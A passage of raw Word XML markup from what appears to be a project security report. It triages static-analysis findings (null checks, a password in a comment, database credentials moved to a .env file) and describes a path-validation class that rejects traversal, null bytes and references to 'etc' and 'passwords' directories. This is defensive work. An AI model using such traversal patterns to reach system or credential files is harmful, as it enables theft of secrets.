                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="32475D55" w14:textId="27FBDC88" w:rsidR="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="129" w:name="_Ref199859981"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="129"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00672F93">
        <w:t>False positive Missing Check against Null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D441D2" w14:textId="77777777" w:rsidR="00D303B9" w:rsidRPr="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47EDFB1E" w14:textId="77777777" w:rsidR="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="493DBAF5" wp14:editId="603A1AD3">
            <wp:extent cx="5731200" cy="114300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="8"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50"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="114300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F9C3DC" w14:textId="64EE821A" w:rsidR="00910649" w:rsidRDefault="00D303B9" w:rsidP="00317D47">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="130" w:name="_Ref199859959"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>32</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="130"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="0011011F">
        <w:t>False positive Missing Check against Null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4CAC1A" w14:textId="7B54BDC5" w:rsidR="00714182" w:rsidRDefault="00714182" w:rsidP="00714182">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="131" w:name="_Toc200039316"/>
      <w:r>
        <w:t>No database password was set</w:t>
      </w:r>
      <w:bookmarkEnd w:id="131"/>
    </w:p>
    <w:p w14:paraId="240AA223" w14:textId="5DE2806B" w:rsidR="00642297" w:rsidRPr="00642297" w:rsidRDefault="00642297" w:rsidP="00642297">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00642297">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>To solve this crucial issue, it was decided that configuration management should be refreshed and an .env file implemented</w:t>
      </w:r>
      <w:r w:rsidR="00E55FC0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="004B34CE">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004B34CE">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200047216 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="004B34CE">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="004B34CE">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="004B34CE" w:rsidRPr="004B34CE">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="004B34CE" w:rsidRPr="004B34CE">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>33</w:t>
      </w:r>
      <w:r w:rsidR="004B34CE">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00E55FC0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00642297">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, in which all sensitive credentials could be defined securely. More precisely, we added a decent username and password for MongoDB, an encrypted password (as required in environments with special character escaping enabled) and an SQLite password for the fallback database. Additionally, the environment profile (prod) was configured to ensure the application ran with the correct settings in production.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FAD123" w14:textId="77777777" w:rsidR="00642297" w:rsidRPr="00642297" w:rsidRDefault="00642297" w:rsidP="00642297">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="132" w:name="_Toc200039317"/>
      <w:r w:rsidRPr="00642297">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This solution significantly improved security, protecting the database from unauthorised access and separating sensitive information from the source code. Consequently, the app is now much safer and ready to be deployed in real-world environments without exposing any obvious vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675BB4B4" w14:textId="77777777" w:rsidR="00AD7B7C" w:rsidRDefault="00AD7B7C" w:rsidP="00AD7B7C">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00AD7B7C">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:noProof/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2932463A" wp14:editId="0EF91215">
            <wp:extent cx="5733415" cy="1967865"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="587532068"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532068" name="Picture 1" descr="A computer screen shot of a program&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId51"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5733415" cy="1967865"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B4C1E7" w14:textId="2BBBC26F" w:rsidR="00AD7B7C" w:rsidRPr="00642297" w:rsidRDefault="00AD7B7C" w:rsidP="00AD7B7C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="133" w:name="_Ref200047216"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>33</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="133"/>
      <w:r>
        <w:t>: .env file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B6FEAB" w14:textId="014F3E9C" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:t>Password Management: Password in Comment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="132"/>
    </w:p>
    <w:p w14:paraId="5BCDBDE2" w14:textId="0D8D8140" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This error is related to the presence of a password in a comment (</w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860014 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D303B9">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). However, this is only an example of usage and does not contain any important </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">information </w:t>
      </w:r>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00086451">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in this case, the password. Therefore, it is a </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>false positive</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D043DF9" w14:textId="77777777" w:rsidR="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="57F37E6C" wp14:editId="3345DC69">
            <wp:extent cx="5386380" cy="3641623"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="41"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52"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5386380" cy="3641623"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B14DD9" w14:textId="50A630AF" w:rsidR="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="134" w:name="_Ref199860014"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>34</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="134"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD0FE9">
        <w:t>False Positive Password in Comment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176FA287" w14:textId="77777777" w:rsidR="00D303B9" w:rsidRPr="00D303B9" w:rsidRDefault="00D303B9" w:rsidP="00D303B9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="028F9CEC" w14:textId="643737F1" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="135" w:name="_Toc200039318"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Path Manipulation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="135"/>
    </w:p>
    <w:p w14:paraId="0E148070" w14:textId="3C64B15B" w:rsidR="001F1A81" w:rsidRDefault="006B3DFB" w:rsidP="006B3DFB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>In this vulnerability there are some false positive sample (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199947348 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="008729A0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="008729A0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199944979 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="008729A0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="008729A0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008729A0">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="006D2376">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and other sample th</w:t>
      </w:r>
      <w:r w:rsidR="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ose</w:t>
      </w:r>
      <w:r w:rsidR="006D2376">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> are mult</w:t>
      </w:r>
      <w:r w:rsidR="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">i-type </w:t>
      </w:r>
      <w:r w:rsidR="006D2376">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">vulnerability </w:t>
      </w:r>
      <w:r w:rsidR="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">so they are fixed in other section because are more related to that one (for example </w:t>
      </w:r>
      <w:r w:rsidR="00F85136" w:rsidRPr="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F85136" w:rsidRPr="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199945098 \h  \* MERGEFORMAT </w:instrText>
      </w:r>
      <w:r w:rsidR="00F85136" w:rsidRPr="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00F85136" w:rsidRPr="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
      </w:r>
      <w:r w:rsidR="00F85136" w:rsidRPr="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00F85136">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> There was only one vulnerability that could be dangerous if an attacker was able to exploit it (</w:t>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199946219 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="001F1A81">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BB12E1" w14:textId="77777777" w:rsidR="006B3DFB" w:rsidRDefault="006B3DFB" w:rsidP="006B3DFB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="006B3DFB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EF466CA" wp14:editId="51180AFB">
            <wp:extent cx="5733415" cy="127000"/>
            <wp:effectExtent l="0" t="0" r="635" b="6350"/>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3415" cy="127000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5023141B" w14:textId="09B2FE46" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="006B3DFB" w:rsidP="006B3DFB">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="_Ref199947348"/>
      <w:bookmarkStart w:id="137" w:name="_Ref199944979"/>
      <w:r>
        <w:t>Figure</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>35</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="137"/>
      <w:r>
        <w:t>: False positive path manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19202EBE" w14:textId="34F1F735" w:rsidR="00262790" w:rsidRPr="00262790" w:rsidRDefault="00262790" w:rsidP="00262790">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">To thwart this vulnerability, a security utility class is introduced </w:t>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199947380 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00102695">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> that centralizes path validation and sanitizing logic, imposing rigorous checks before any file system operation. When presented with a sequence of path segments, the class examines each for suspicious patterns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>such as traversal to parent directories ("."), disk drive separators, null bytes, or references to security-sensitive directories ("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"passwords"). If a segment is found to be unsafe, it immediately throws an exception, halting execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639B419D" w14:textId="575E5CB0" w:rsidR="00262790" w:rsidRPr="00262790" w:rsidRDefault="00262790" w:rsidP="00262790">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Having checked the constituent parts, the class combines them into a complete path in a given base directory. It uses a secure method of path construction and checks that the resulting absolute URL remains inside the permitted directory: otherwise, an exception is raised. This two-stage test</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>checking of the components and verification of the resolved path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
